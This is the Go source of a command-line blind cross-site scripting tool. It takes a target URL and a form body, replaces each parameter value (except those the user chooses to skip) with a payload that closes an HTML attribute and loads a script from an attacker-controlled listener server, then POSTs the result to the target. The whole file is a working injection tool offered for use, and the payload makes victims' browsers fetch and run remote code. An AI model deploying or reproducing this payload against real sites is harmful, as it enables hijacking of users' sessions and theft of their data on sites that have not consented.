package main

import (
	"bytes"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"slices"
	"strconv"
	"strings"
)

//Usage blixss -target <<target url>> -body <<post body>> -listener <<listener server>> -not <<omitted parameters>>
// e.g "blixss -target "http://example.com" -body "parameter1=test&parameter2=test2&parameter3=test3" -listener "http://10.10.15.122:45000" -not "parameter2,parameter3"

import (
	"os"
)

func main() {

	var (
		targetUrl      string
		postBody       string
		listenerServer string
		not            string
	)

	notRegPattern := "^\\w+(,\\w+)*$"

	flag.StringVar(&targetUrl, "target", "", "Target URL")
	flag.StringVar(&postBody, "body", "", "Post Body")
	flag.StringVar(&listenerServer, "listener", "", "Server Listener")
	flag.StringVar(&not, "not", "", "Omitted parameters.")
	flag.Parse()

	// Check if target is valid URL
	if targetUrl == "" {
		fmt.Println("You must specify a valid target URL. Use -target \"http://address\"")
		os.Exit(1)
	}

	//Check if body value is correctly formated
	if postBody == "" {
		fmt.Println("Body parameters are empty. Use -body \"parameter=value1&optional=value2\" .")
		os.Exit(1)
	}
	bodyValues, err := url.ParseQuery(postBody)
	if err != nil {
		fmt.Println("Invalid body parameters format. Use -body \"parameter=value1&optional=value2\" .")
		os.Exit(1)
	}

	//Check omited values
	if not != "" {
		match, err := regexp.MatchString(notRegPattern, not)
		if err != nil || match != true {
			fmt.Println("Invalid not flag format. Use -not \"parameter1,parameter2\"")
			os.Exit(1)
		}
	}
	notArray := strings.Split(not, ",")

	//Check is listener is valid
	if listenerServer == "" {
		fmt.Println("You must specify a server to forward the requests. Please use -listener \"http://address\"")
		os.Exit(1)
	}
	if strings.HasSuffix(listenerServer, "/") {
		listenerServer = listenerServer[:len(listenerServer)-1]
	}

	//Re-encoding body data and crafting malicious request
	payload := getPayload(bodyValues, listenerServer, notArray).Encode()
	client := &http.Client{}
	req, err := http.NewRequest("POST", targetUrl, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		fmt.Println("Invalid request.")
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	//Sending request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("An error has occurred. Couldn't make request")
	}
	stringResponse := "Request sent. Response code: " + strconv.Itoa(resp.StatusCode)
	fmt.Println(stringResponse)

}

func getPayload(body url.Values, listener string, not []string) url.Values {
	payload := url.Values{}
	for paramName, paramValue := range body {
		if slices.Contains(not, paramName) {
			//If user indicates to omit this param, we set the input value.
			payload.Add(paramName, paramValue[0])
		} else {
			newValue := "\"><script src=\"" + listener + "/" + paramName + "\"></script>"
			payload.Add(paramName, newValue)
		}
	}

	return payload
}
